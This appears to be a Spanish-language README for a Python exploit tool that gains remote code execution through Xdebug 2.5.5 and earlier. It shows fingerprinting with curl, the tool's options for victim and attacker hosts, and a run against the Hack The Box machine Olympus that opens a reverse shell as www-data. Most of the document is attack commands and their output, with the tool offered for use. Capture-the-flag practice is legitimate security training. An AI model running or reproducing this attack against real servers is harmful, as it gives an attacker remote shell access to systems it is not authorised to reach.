# Xdebug Command Execution

## Descripción
Exploit que permite la ejecución de código remoto debido al uso de la tecnología Xdebug de versión 2.5.5 y anteriores

```bash
❯ curl -I -X OPTIONS http://10.10.10.83/
HTTP/1.1 200 OK
Date: Sun, 19 Sep 2021 02:37:47 GMT
Server: Apache
Vary: Accept-Encoding
X-Content-Type-Options: nosniff
X-Frame-Options: sameorigin
X-XSS-Protection: 1; mode=block
Xdebug: 2.5.5
Content-Length: 314
Content-Type: text/html; charset=UTF-8
```
El exploit manda un valor aleatorio de la cookie **XDEBUG_SESSION**, permitiendo que se entable una conexión hacia nuestra máquina a través del puerto 9000. Para facilitar la intrusión, se manda una reverse shell para tener una shell interactiva.

## Uso

```bash
❯ python3 xdebug_rce.py
usage: xdebug_rce.py [-h] --rhost RHOST --lhost LHOST [--lport LPORT]
xdebug_rce.py: error: the following arguments are required: --rhost, --lhost

❯ python3 xdebug_rce.py -h
usage: xdebug_rce.py [-h] --rhost RHOST --lhost LHOST [--lport LPORT]

Xdebug Command Execution

optional arguments:
  -h, --help     show this help message and exit
  --rhost RHOST  Remote host ip (Victim)
  --lhost LHOST  Local host ip (Attacker)
  --lport LPORT  Local port (default: 443)
```

Se ejecutó el exploit en la máquina **Olympus** de la plataforma Hack The Box.
```bash
❯ python3 xdebug_rce.py --rhost 10.10.10.83 --lhost 10.10.14.16
[+] Payload: Connection received from 10.10.10.83:41628 on port 9000
[+] Trying to bind to :: on port 443: Done
[+] Waiting for connections on :::443: Got connection from ::ffff:10.10.10.83 on port 59744
[+] Reverse shell: Established connection
[*] Switching to interactive mode
$ whoami
www-data
$ 
```
